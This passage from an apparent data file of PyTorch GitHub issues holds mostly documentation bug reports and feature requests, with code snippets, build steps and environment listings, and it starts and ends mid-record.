üêõ Bug\r\n\r\nWhen the median value lies between two elements, torch.median returns the floor instead of the average.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. start a python shell\r\n2. run torch.tensor([1, 2, 3, 4]).median()\r\n3. observe the result is 2 instead of 2.5\r\n\r\n```\r\nimport torch\r\ntorch.tensor([1, 2, 3, 4]).median()\r\n```\n\ncc @jlin27 @mruberry"},{"labels":["documentation",null,null],"text":"We should add the appropriate documentation, registration, and tests. See also https://github.com/pytorch/pytorch/issues/36403. \r\n\r\n@albanD \n\ncc @suo @ezyang @SsnL @albanD @zou3519 @gqchen"},{"labels":[null,"documentation",null],"text":"## üêõ Bug\r\n\r\nAccording to the [documentation](https://pytorch.org/docs/stable/cpp_extension.html#torch.utils.cpp_extension.verify_ninja_availability), the `verify_ninja_availability()` function should return True if Ninja is available on the user system.\r\n\r\nHowever, quickly looking at the implementation shows that it returns nothing and just raises a RuntimeError if ninja is not available.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n```python\r\n# Run on system with and without Ninja\r\n\r\nfrom torch.utils.cpp_extension import verify_ninja_availability\r\nverify_ninja_availability()   # Does not return bool\r\n```\r\n\r\n## Expected behavior\r\n\r\nEither the documentation should be updated to correctly tell it will raise an error, or the function itself should be modified to return a boolean.\r\n\r\nPersonally, I am more in favor of returning a boolean, as it is annoying to need to wrap a function in a try/except.\r\n\r\n## Environment\r\nPyTorch version: 1.5.0+cu101\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.1\r\n\r\nOS: Ubuntu 16.04.6 LTS\r\nGCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609\r\nCMake version: version 3.5.1\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: Could not collect\r\nGPU models and configuration:\r\nGPU 0: Quadro M2000\r\nGPU 1: GeForce GTX 1080 Ti\r\n\r\nNvidia driver version: 418.56\r\ncuDNN version: Could not collect\r\n\r\nVersions of relevant libraries:\r\n[pip3] lightnet-torch==1.1.0\r\n[pip3] numpy==1.16.1\r\n[pip3] torch==1.5.0+cu101\r\n[pip3] torchfile==0.1.0\r\n[pip3] torchsummary==1.5.1\r\n[pip3] torchvision==0.6.0+cu101\r\n[conda] Could not collect\r\n\n\ncc @yf225 @glaringlee"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/quantization.html#torch.quantization.add_quant_dequant\r\n\r\n#### API\r\n\r\n`torch.quantization.add_quant_dequant` \r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there is an input :\r\n\r\n**we want to quantize** (*that*) ‚Äì\r\n\r\nwhich should be part of the description for input argument `module`\r\n\r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/torch.html#torch.add\r\n\r\n#### API\r\n\r\n`torch.add`\r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there is an input `value` , but it is not in the signature, and it is not accepted by the function. It should be `other`\r\n\r\nRunning code :\r\n\r\n~~~python\r\na = torch.randn(4)\r\ntorch.add(a, other=20, value=1)\r\n~~~\r\n\r\ngives exception \r\n\r\n~~~python\r\nTypeError: add() got an unexpected keyword argument 'value'\r\n~~~\r\n\r\n\r\n\r\n#### **System information**\r\n\r\n- OS: MacOS Mojave 10.14\r\n- PyTorch version: 1.7.0.dev20200819+cpu\r\n- Python version: 3.8.2\r\n"},{"labels":["documentation",null,null],"text":"When the PR that enables async user function for `rpc.remote` is added to the stack started from #39216, update the master `rpc.rst` doc to mention it in `rpc.rpc_sync`, `rpc.rpc_async`, and `rpc.remote` APIs.\n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528 @jjlilley @osalpekar"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nhttps://pytorch.org/docs/master/generated/torch.nn.BatchNorm2d.html\r\n\r\nHere the var[x] of the denominator is population variance dividing by N. It should be precisely clarified here. Otherwise, the reader may use the sample variance by calling tensor.var() which is divided by N - 1.  "},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/torch.html#torch.mul\r\n\r\n#### API\r\n\r\n`torch.mul` \r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there are inputs :\r\n\r\n**{input}** ‚Äì\r\n\r\n**{out}** ‚Äì\r\n\r\n\r\n\r\nAnd input argument `value` is not in the signature, which is also not accepted by the function. It should be `other`\r\n\r\nRunning code:\r\n\r\n~~~python\r\na = torch.randn(3)\r\ntorch.mul(a, other=100, value=100)\r\n~~~\r\n\r\ngot exception:\r\n\r\n~~~python\r\nTypeError: mul() got an unexpected keyword argument 'value'\r\n~~~\r\n\r\n#### **System information**\r\n\r\n- OS: MacOS Mojave 10.14\r\n- PyTorch version:  1.5.0\r\n- Python version: 3.8.2"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/jit.html#torch.jit.trace_module\r\n\r\n#### API\r\n\r\n`torch.jit.trace_module`\r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there is an input `example_inputs`, but it is not in the signature, and it is not accepted by the function. It should be `inputs`\r\n\r\nRunning the example code from the document:\r\n\r\n~~~python\r\nimport torch.nn as nn\r\n\r\nclass Net(nn.Module):\r\n    def __init__(self):\r\n        super(Net, self).__init__()\r\n        self.conv = nn.Conv2d(1, 1, 3)\r\n\r\n    def forward(self, x):\r\n        return self.conv(x)\r\n\r\n    def weighted_kernel_sum(self, weight):\r\n        return weight * self.conv.weight\r\n\r\n\r\nn = Net()\r\nexample_weight = torch.rand(1, 1, 3, 3)\r\nexample_forward_input = torch.rand(1, 1, 3, 3)\r\n\r\n# Trace a specific method and construct `ScriptModule` with\r\n# a single `forward` method\r\nmodule = torch.jit.trace(n.forward, example_forward_input)\r\n\r\n# Trace a module (implicitly traces `forward`) and construct a\r\n# `ScriptModule` with a single `forward` method\r\nmodule = torch.jit.trace(n, example_forward_input)\r\n\r\n# Trace specific methods on a module (specified in `inputs`), constructs\r\n# a `ScriptModule` with `forward` and `weighted_kernel_sum` methods\r\ninputs = {'forward' : example_forward_input, 'weighted_kernel_sum' : example_weight}\r\n~~~\r\n\r\nand calls the function: \r\n\r\n~~~python\r\nmodule = torch.jit.trace_module(n, example_inputs=inputs)\r\n~~~\r\n\r\ngives exception \r\n\r\n~~~python\r\nTypeError: trace_module() got an unexpected keyword argument 'example_inputs'\r\n~~~\r\n\r\n\r\n\r\n#### **System information**\r\n\r\n- OS: macOS Mojave 10.14\r\n- PyTorch version:  1.5.0\r\n- Python version: 3.8.2\r\n\r\n\r\ncc @suo"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\nThe document enclosing the details of how one installs the C++ distribution of Pytorch, found [here](https://pytorch.org/cppdocs/installing.html), is missing one paragraph of code between the sentences _In that case CMake configuration step would look something like follows:_ and _If all goes well, it will look something like this:_\r\n\r\nApologies if this is not the place to report this, this was the best fit according to the template text.\r\n\n\ncc @yf225 @glaringlee"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nAs title, `torch.backends` is undocumented\r\n\r\nRelated issue: https://github.com/pytorch/pytorch/issues/12468\r\n\r\nFYI, here is the search suggestions for `torch.b`. Seems that many people are searching for `torch.backends.cudnn.{benchmark, deterministic, enabled}`\r\n![image](https://user-images.githubusercontent.com/6421097/83131164-0b6d9380-a0a5-11ea-8a52-f4e340cf4e82.png)\r\n\r\n"},{"labels":[null,null,"documentation",null],"text":"Originally in https://github.com/pytorch/pytorch/issues/18095#issuecomment-633149307:\r\n\r\n@vadimkantorov:\r\nWorks: https://pytorch.org/docs/stable/torch.html#torch.flip\r\nBreaks: https://pytorch.org/docs/master/torch.html#torch.flip\r\n\r\n@t-vi:\r\nThey're now separate pages: https://pytorch.org/docs/master/generated/torch.flip.html#torch.flip\r\n...but it would break many links, including on the forums.\r\n\r\n@ezyang:\r\nYes, this will be a release blocker for next release.\r\n\r\ncc @ezyang @gchanan @zou3519 @mattip"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nI am trying to understand what the function \"coalesce\" does for sparse tensors [here](https://pytorch.org/docs/stable/sparse.html#torch.sparse.FloatTensor.coalesce). However, the API is not provided. \r\n\n\ncc @vincentqb"},{"labels":[null,"documentation",null,null],"text":"`torch.cuda.nccl` seems meant to be a set of low-level API (compared to `torch.cuda.comm` and `torch.distributed`). It would be great to document it.\n\ncc @ngimel"},{"labels":[null,null,"documentation",null],"text":"`torch.cuda.comm` and `torch.distributed` have similar but subtly different API sets. It would be great to make them consistent, and document the former.\n\ncc @ngimel @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar"},{"labels":["documentation",null],"text":"This is a summary of the potential doc improvements that I came up with. I can work on a pull request for these changes after review of what changes need to be made.\r\n\r\n1. Make clear that `torch.set_default_dtype` and `torch.get_default_dtype` only affect `torch.Tesor` and not `torch.tensor`.\r\n   \r\n    Suggestion:-\r\n    In [torch.set_default_dtype](https://pytorch.org/docs/stable/torch.html#torch.set_default_dtype) change:\r\n    The default floating point dtype is initially `torch.float32`. -> The default floating-point dtype used by `torch.Tensor` is initially `torch.float32`.\r\n\r\n    In [torch.get_default_dtype](https://pytorch.org/docs/stable/torch.html#torch.get_default_dtype) change:\r\n    Get the current default floating-point `torch.dtype` -> Get the current default floating point `torch.dtype` used by `torch.Tensor`.\r\n\r\n2. Specify the default value of **sci_mode** in [torch.set_printoptions](https://pytorch.org/docs/stable/torch.html#torch.set_printoptions). \r\n\r\n    Currently, it says to look for the default value defined by _Formatter. But to get to the default value a lot of work has to be done like:\r\n    ```python\r\n    torch.set_printoptions??  # Get location `torch/_tensor_str.py`\r\n    torch._tensor_str._Formatter??  # Default value defined in the __init__ method of this class\r\n    ```\r\n\r\n    Suggestion:-\r\n    Specify the default value of `False` in the docs or specify the exact path of `_Formatter` as `torch._tensor_str._Formatter`.\r\n\r\n3. The header of [torch.full_like](https://pytorch.org/docs/stable/torch.html#torch.full_like) is placed incorrectly.\r\n\r\n4. Add example for [torch.split](https://pytorch.org/docs/stable/torch.html#torch.split).\r\n\r\n5. Add a note/warning in [torch.squeeze](https://pytorch.org/docs/stable/torch.html#torch.squeeze). When using batch_size=1, using torch.squeeze can result in an error. So add a warning telling the users to be careful when using torch.squeeze.\r\n\r\n6. The header of [torch.randint(low=0, high, size](https://pytorch.org/docs/stable/torch.html#torch.randint) is placed incorrectly.\r\n\r\n7. The header of [torch.randint_like](https://pytorch.org/docs/stable/torch.html#torch.randint_like) is placed incorrectly.\r\n   \r\n8. Add documentation for `_use_new_zipfile_serialization=False` argument of [torch.save](https://pytorch.org/docs/stable/torch.html#torch.save) + Add example using the above argument and pickle_protocol=4/5.\r\n\r\n9. "},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nMany classes, methods and functions lack docstrings. They should be added or clear reasons provided for not documenting them. xref gh-38244 which refactored the documentation coverage checks: the undocumented items are all listed in `docs/source/conf.py` in `coverage_ignore*` lists"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nFunctions with multiline signature are not properly displayed in the online docs\r\n\r\nTake `randint` as an example, the function signature takes two lines in the docstring. \r\n\r\nhttps://github.com/pytorch/pytorch/blob/15da26f8aafe50fb34d343d872c7461546d7a317/torch/_torch_docs.py#L4667-L4670\r\n\r\nBut on the docs website https://pytorch.org/docs/master/generated/torch.randint.html, the second line is not recognized as part of the function signature. \r\n\r\n![image](https://user-images.githubusercontent.com/6421097/82273101-21ab7f00-9942-11ea-8e9b-717d3fa52684.png)\r\n\r\nA similar issue happens to the index page as well: the second column shows the first line of the signature, instead of the description. \r\n\r\n![image](https://user-images.githubusercontent.com/6421097/82273128-3d168a00-9942-11ea-9f95-64cb698f4cb4.png)\r\n\n\ncc @ezyang @zou3519"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nIt would be nice to have explicit statement in the documentation that `torch.optim.lr_scheduler.ReduceLROnPlateau` with `mode=min` and `threshold_mode='rel'` expects loss to be `> 0`\r\n\r\nThis is the excerpt from documentation about `threshold_mode`:\r\n```\r\nthreshold_mode (str): One of `rel`, `abs`. In `rel` mode,\r\ndynamic_threshold = best * ( 1 + threshold ) in 'max'\r\nmode or best * ( 1 - threshold ) in `min` mode.\r\nIn `abs` mode, dynamic_threshold = best + threshold in\r\n`max` mode or best - threshold in `min` mode. Default: 'rel'.\r\n```\r\n\r\nAnd this is the corresponding excerpt from the code:\r\n```python\r\ndef is_better(self, a, best):\r\n    if self.mode == 'min' and self.threshold_mode == 'rel':\r\n        rel_epsilon = 1. - self.threshold\r\n        return a < best * rel_epsilon\r\n\r\n    elif self.mode == 'min' and self.threshold_mode == 'abs':\r\n        return a < best - self.threshold\r\n\r\n    elif self.mode == 'max' and self.threshold_mode == 'rel':\r\n        rel_epsilon = self.threshold + 1.\r\n        return a > best * rel_epsilon\r\n\r\n    else:  # mode == 'max' and epsilon_mode == 'abs':\r\n        return a > best + self.threshold\r\n```\r\n\r\nI use `NegativeDiceLoss` in my experiments so the loss is negative and is expected to be minimized. The only correct mode of `ReduceLROnPlateau` I can use is `threshold_mode='abs'` because `threshold_mode='rel'` will not work for minimizing negative loss.\r\n\r\nImagine `mode='min', threshold_mode='rel', threshold=0.1`:\r\n* If we use loss that is expected to be > 0 all the time and current loss value is `10` than dynamic threshold will be `(1 - 0.1) * 10 == 9`. And the check will be `a < 9`. So there will be a margin between previous loss value and the new one to ensure that model improved.\r\n* If we use loss that is expected to be < 0 all the time (as in my case with `NegativeDiceLoss`) and current loss value is `-10` than dynamic threshold will be `(1 - 0.1) * -10 == -9`. And the check will be `a < -9`. __It does not correspond to logic of scheduler__ as it allows new loss value to be slightly worse than previous. As I understand the goal of the dynamic threshold is to guarantee that the loss improved __by some margin__ to deal with noise in loss calculations.\r\n\r\nIf my understanding is correct it is better to __explicitly state in documentation__ that for `threshold_mode='rel'` only positive loss functions are expexted. Probably negative loss functions are not common to use but sometimes they are required (as with dice score as loss function).\r\nPlease correct me if I'm wrong :)"},{"labels":["documentation",null],"text":"The editors portion of the CITATION file located [here](https://github.com/pytorch/pytorch/blob/master/CITATION) is not formatted properly. Specifically this part:\r\n\r\n`editor = {H. Wallach and H. Larochelle and A. Beygelzimer and F. d\\textquotesingle Alch\\'{e}-Buc and E. Fox and R. Garnett}`\r\n\r\nMy goal is to make the citation work with [citeas.org](https://citeas.org). But I had to ignore that part of the citation to make it work."},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nMore often than not, integer quantization is performed by \"simulating\" quantisation during the forward pass and let the gradients flow unchanged during back propagation (i.e. using Straight Through Estimator, STE). \r\n\r\nFrom the description in [FakeQuantize](https://pytorch.org/docs/stable/_modules/torch/quantization/fake_quantize.html#FakeQuantize) I think it's fair to assume that STE is used since nothing is mentioned about what happens during backward pass. However, FakeQuantize does not use STE. (evidence [here](https://github.com/pytorch/pytorch/blob/fe44741dbac80c73139306f46da8b719d44444d3/aten/src/ATen/native/quantized/cuda/fake_quantize_core.cu#L67) showing the CUDA implementation). The backward pass does gradient clipping. \r\n\r\nI think this should be mentioned (maybe as a \"Note\"?) in the DOCs since these two approaches for backward prop can lead to very different results in some cases. \n\ncc @jerryzh168 @jianyuh @dzhulgakov @raghuramank100 @jamesr66a"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nThere are three minor problems in the `torch.norm` docs:\r\nThe default value of `torch.norm`'s `p` parameter is `fro`, but at the same time, the table of values for `ord` (Bug 1: mismatch to the parameter name) lists no vector norm for `ord=\"fro\"` (only for `ord=None`) (Bug 2). Finally, the quote signs are wrong (Bug 3).\r\n"},{"labels":["documentation",null,null],"text":"## üöÄ Feature\r\nThe current official docs don't have specific examples regarding the use of seeds and worker_init_fn in order to attain a certain degree of reproducibility.\r\nFollowing the suggestion by @ptrblck in the [thread](https://discuss.pytorch.org/t/reproducibility-with-all-the-bells-and-whistles/81097), I would like to add the solutions mentioned to the official docs.\r\n\r\n## Motivation\r\nWhile participating in a Kaggle competition I ended up spending countless hours of GPU compute on reproducing my results across followup runs of the pipeline but I realized it too late that the number of workers, the seeds **inside** these works all affect the outcome of the run. I searched a lot of discussions and docs to end up realizing how to use the worker_init_fn and what to expect from it. I would not want people to end up where I did so I would like to give them a heads up with whatever I have understood.\r\n\r\n## Pitch\r\nAs suggested by @ptrblck , I would like to update the [doc](https://pytorch.org/docs/stable/notes/randomness.html) with the code examples and give people a clear heads-up regarding the dependency of the results on the workers and seeds and how they may be able to reach an acceptable level of reproducibility.\r\n\r\n## Alternatives\r\nAs far as I can tell, this would be the most thorough example.\r\n\r\n## Additional context\r\nN/A\r\n\n\ncc @jlin27"},{"labels":[null,"documentation",null,null],"text":"## üìö Documentation MISSING\r\n\r\n Currently, the only documentation on the pages says \"The author of this package has not provided a project description\"\r\n\r\nCan I have permission or a contact person to call so I can help add more instructions, a README.md or work to implement existing pages that need documentation? \r\n\r\nThe <Project description> on website https://pypi.org/project/torch/ is where I am referencing and I would be happy to start adding documentation as Torch is on my list of things to learn. -->\r\n\r\n<!-- Currently, the only documentation on the pages says \"The author of this package has not provided a project description\"\r\n\r\nCan I have permission or a contact person to call so I can help add more instructions, a README.md or work to implement existing pages that need documentation? \r\n\r\nThe <Project description> on website https://pypi.org/project/torch/ is where I am referencing and I would be happy to start adding documentation as Torch is on my list of things to learn. -->\r\n\n\ncc @malfet"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nTo reproduce:\r\n- go to https://pytorch.org/docs/master/generated/torch.geqrf.html?highlight=geqrf#torch.geqrf\r\n- Click  \"Click here to view docs for latest stable release.\"\r\n- Watch as it leads to a 404 page.\r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nhttps://pytorch.org/docs/master/nn.functional.html#torch.nn.functional.upsample\r\n\r\n![image](https://user-images.githubusercontent.com/5652049/81728167-07f8cc00-9458-11ea-913f-8928a4bd3ab9.png)\r\n\r\nIt says it \"has to be an integer\", but the parenthesis says it can be a \"float or Tuple[Float]\".\r\n\r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\nI was going through the [https://pytorch.org/tutorials/recipes/recipes/loading_data_recipe.html](new) documentation. I tried to run the google colab notebook and looks like there is this error. "},{"labels":[null,null,null,"documentation",null,null],"text":"## üêõ Bug\r\n\r\nDear community,\r\n\r\nI am a dev from [KeOps project](https://github.com/getkeops/keops/) building optimized operations written in C++/Cuda that are compatible with pytorch (among others scientific languages). \r\n\r\nWe successfully build python modules compatible with pyTorch since the pyTorch v0.2... But the last v1.5 broke our modules with a runtime error complaining about [missing symbols](https://github.com/getkeops/keops/issues/59).\r\n\r\n\r\nTo simplify the analysis you may find below a minimal working example that builds a module through pybind11n the spirit of [pytorch doc](https://pytorch.org/tutorials/advanced/cpp_frontend.html#writing-a-basic-application). \r\n\r\nIt should output a file `test_module.cpython-38-x86_64-linux-gnu.so` that can be imported from python. This module works well when building with pytorch 1.4 but raised a runtime error when building with pytorch v1.5. \r\n\r\n\r\n## To Reproduce\r\n\r\nAssuming pyTorch and pybind11 installed (e.g. through conda).  There are 2 files\r\n\r\n`module_test.cpp` contains\r\n\r\n```cpp\r\n#include <torch/extension.h>\r\n#include <pybind11/pybind11.h>\r\n// Main function\r\nat::Tensor foo(int s) {\r\n     return torch::eye(s);\r\n}    \r\n\r\n// PyBind11 entry point \r\nPYBIND11_MODULE(test_module, m) {\r\nm.def(\"foo\", &foo, \"Entry point to test module\");\r\n}\r\n```   \r\nand `CMakeList.txt` contains\r\n```\r\nproject(test_module LANGUAGES CXX)\r\n\r\nfind_package(Torch REQUIRED)\r\nfind_package(pybind11  REQUIRED)\r\n\r\npybind11_add_module(test_module ${CMAKE_CURRENT_SOURCE_DIR}/test_module.cpp)\r\ntarget_link_libraries(test_module PUBLIC \"${TORCH_LIBRARIES}\")\r\n```\r\nit can be compile with\r\n\r\n ```bash\r\n$ mkdir build\r\n$ cd build\r\n$ cmake -DCMAKE_PREFIX_PATH=\"/home/bcharlier/.conda/envs/keops/lib/python3.8/site-packages/torch/\" .. && make\r\n```\r\nand run with (note that `torch` is imported first)\r\n```\r\n$ python -c \"import torch; print(torch.__version__); import test_module; print(test_module.foo(3))\"\r\n\r\n1.5.0\r\nTraceback (most recent call last):\r\n  File \"<string>\", line 1, in <module>\r\nImportError: /home/bcharlier/src/test_module/build/test_module.cpython-38-x86_64-linux-gnu.so: undefined symbol: _Z16THPVariable_WrapN2at6TensorE\r\n```\r\nThe missing symbol is not exactly the same when [building a module with the keops library](https://github.com/getkeops/keops/issues/59)... But I guess this is irrelevant.\r\n\r\n## Expected behavior\r\n\r\nIt works fine when compiling with pytorch v1.4\r\n\r\n```bash\r\n$ cmake -DCMAKE_PREFIX_PATH=\"/home/bcharlier/.conda/envs/keops_torch14/lib/python3.8/site-packages/torch/\" .. && make\r\n$ python -c \"import torch; print(torch.__version__); import test_module; print(test_module.foo(3))\"\r\n1.4.0\r\ntensor([[1., 0., 0.],\r\n        [0., 1., 0.],\r\n        [0., 0., 1.]])\r\n```\r\n\r\n## Environment\r\n\r\nThe bug was reported by various users running on linux. Here is my config:\r\n\r\n```\r\nCollecting environment information...\r\nPyTorch version: 1.5.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.2\r\n\r\nOS: Arch Linux\r\nGCC version: (Arch Linux 9.3.0-1) 9.3.0\r\nCMake version: version 3.14.0\r\n\r\nPython version: 3.8\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.2.89\r\nGPU models and configuration: GPU 0: Quadro T2000\r\nNvidia driver version: 440.82\r\ncuDNN version: /usr/lib/libcudnn.so.7.6.5\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.18.4\r\n[conda] blas                      1.0                         mkl  \r\n[conda] cudatoolkit               10.2.89              hfd86e86_1  \r\n[conda] mkl                       2020.0                      166  \r\n[conda] mkl-service               2.3.0            py38he904b0f_0  \r\n[conda] mkl_fft                   1.0.15           py38ha843d7b_0  \r\n[conda] mkl_random                1.1.0            py38h962f231_0  \r\n[conda] numpy                     1.18.1           py38h4f9e942_0  \r\n[conda] numpy-base                1.18.1           py38hde5b4d6_1  \r\n[conda] pytorch                   1.5.0           py3.8_cuda10.2.89_cudnn7.6.5_0    pytorch\r\n\r\n```\n\ncc @ezyang @gchanan @zou3519 @malfet @yf225 @glaringlee"},{"labels":[null,"documentation",null,null],"text":"## üìö Documentation\r\n\r\nCurrently the build from source info references Anaconda since it is \"easier\". May be the case but as an experienced software packager I would really love information for the full build process that does not involve Anaconda training wheels. I do not want or plan to have anything to do with anaconda on servers I manage.\r\n\r\nIs there an old version of the build from source documentation still available somewhere? The old documentation described the entire process in detail.\r\n\r\nThanks.\n\ncc @malfet"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\nAfter gh-37419, there are now [subtopic pages](https://pytorch.org/docs/master/generated/torch.is_tensor.html#torch.is_tensor) underneath the [main topic pages](https://pytorch.org/docs/master/torch.html). \r\n\r\nShould the subtopic pages have a right-navbar to indicate where they fall inside the topic pages?\r\n\r\nIn any case, the left- and right- navbars are quite long without alot of visual formatting to indicate where the current page is located. Indenting or color or other clues could help users see where they are.\n\ncc @ezyang @zou3519"},{"labels":[null,"documentation",null],"text":"Currently documentation builds emit many warnings. We should resolve them, then turn on `-WT --keep-going` to report warnings as errors so that new build problems are caught as they are created.\r\n\n\ncc @ezyang @zou3519"},{"labels":[null,"documentation",null,null],"text":"## üìö Documentation\r\n\r\ngh-37419 split up the \"heaviest\" pages into a leading pages and subpages. More can be done to split up pages (these have the most lines of HTML):\r\n- [ ] [`docs/source/quantization.rst](https://pytorch.org/docs/stable/quantization.html)\r\n- [ ] [`docs/source/tensors.rst`](https://pytorch.org/docs/stable/tensors.html#torch.Tensor)\r\n- [ ] [`docs/source/nn.fuctional.rst`](https://pytorch.org/docs/stable/nn.functional.html)\r\n- [ ] [`docs/source/distributions.rst`](https://pytorch.org/docs/stable/distributions.html)\r\n- [ ] [`docs/source/autograd.rst`](https://pytorch.org/docs/stable/autograd.html)\r\n\r\nThe strategy would start with using `autosummary` like in gh-37419, but more work might be needed to split up classes with many methods. \n\ncc @ezyang @zou3519"},{"labels":["documentation",null,null],"text":"The docstring for the Optimizer class notes that when using the `.step` function with a closure, this closure should not change the parameter gradients:\r\n\r\nhttps://github.com/pytorch/pytorch/blob/4e93844ab168ee0cf1aaa1b4712d6aad0e2972f8/torch/optim/optimizer.py#L174-L176\r\n\r\nHowever, every example I've found seems do be doing exactly that, e.g. also on the `torch.optim` documentation on the same page:\r\n\r\n```python\r\nfor input, target in dataset:\r\n    def closure():\r\n        optimizer.zero_grad()\r\n        output = model(input)\r\n        loss = loss_fn(output, target)\r\n        loss.backward()\r\n        return loss\r\n    optimizer.step(closure)\r\n```\r\n\r\nIs the note about not changing the gradients in the closure outdated?\n\ncc @vincentqb"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\ntorch.nn.Module has the peculiar (not quite Pythonic) requirement of __init__ of the parent class prior to self assignment on the child.  Without this, the user encounters myriad issues with modular model composition like this:\r\n\r\nAttributeError: cannot assign module before Module.__init__() call\r\n\r\nThe documentation should make the Gotcha crystal clear. \r\n\r\nIdeally, this behavior could and really should be changed through better use of reflection. \r\n\r\n"},{"labels":["documentation",null,null,null],"text":"The pybind-exposed `TensorPipeRpcBackendOptions` in `rpc/init.cpp` should include proper documents to explain the API.\n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528 @jjlilley @osalpekar @jiayisuse @lw @beauby"},{"labels":["documentation",null],"text":"It isn't mentioned in PyTorch docs about the Set()\r\nAlso, the Cmake file isn't quite complete and needs to be updated. Maybe new users don't know about it.\r\n```\r\nset(CMAKE_PREFIX_PATH \"libtorch/share/cmake/Torch\")\r\n```\r\n[here](https://pytorch.org/tutorials/advanced/cpp_frontend.html) as well as [here](https://pytorch.org/tutorials/advanced/cpp_export.html)\r\n\r\nThe CMake file needs to be clear in the documentation. It is causing trouble for many people.\r\n#12449 #21976 #806 #12449\r\n\r\nIt's not a bug. But a doc improvement issue."},{"labels":[null,null,"documentation",null],"text":"## üöÄ Feature\r\n\r\nTLDR: Could we attach docstring to `torch/__init__.pyi` so that VSCode/PyCharm/IntelliJ can show the documents in a popup window? \r\n\r\nIt would make the development experiment much smoother if we could view the docs without leaving the IDE. \r\n\r\n## Motivation\r\n\r\nWe currently use a programmatically way (e.g., `add_docstr` as in [torch/_tensor_docs.py](https://github.com/pytorch/pytorch/blob/master/torch/_tensor_docs.py)) to set the docstring for functions written in C++/CUDA. \r\n\r\nWhile it works pretty well for Sphinx to generate the HTML docs, it makes the IDEs difficult to pick up the modified docstring without actually executing the code. \r\n\r\nHere is a simple code snippet to illustrate this point: \r\n| IDE | Screenshot |\r\n| --- | --- | \r\n| VSCode | ![image](https://user-images.githubusercontent.com/6421097/80958455-adfa6580-8dca-11ea-8ef2-20cf20c206db.png) | \r\n| PyCharm <br> IntelliJ |  ![image](https://user-images.githubusercontent.com/6421097/80959326-375e6780-8dcc-11ea-8745-32eb12a7a563.png)| \r\n\r\n## Pitch\r\n\r\nI am thinking if we could insert the docstring from [torch/_tensor_docs.py](https://github.com/pytorch/pytorch/blob/master/torch/_tensor_docs.py), [torch/_torch_docs.py](https://github.com/pytorch/pytorch/blob/master/torch/_torch_docs.py), [torch/_storage_docs.py](https://github.com/pytorch/pytorch/blob/master/torch/_storage_docs.py) to [torch/__init__.pyi](https://github.com/pytorch/pytorch/blob/master/torch/__init__.py) by modifying [tools/pyi/gen_pyi.py](https://github.com/pytorch/pytorch/blob/master/tools/pyi/gen_pyi.py). \r\n\r\n\r\n## Additional context\r\n\r\nHere is a comparison between PyTorch and Tensorflow using `add` as an example. \r\n\r\n| IDE | `torch.add` | `tensorflow.add` | \r\n| --- | --- | --- | \r\n| VSCode | ![image](https://user-images.githubusercontent.com/6421097/80959800-29f5ad00-8dcd-11ea-8ede-a7c7c2a0ec60.png) | ![image](https://user-images.githubusercontent.com/6421097/80959833-3b3eb980-8dcd-11ea-8736-969e6dbcf4e8.png) | \r\n| PyCharm <br> IntelliJ | 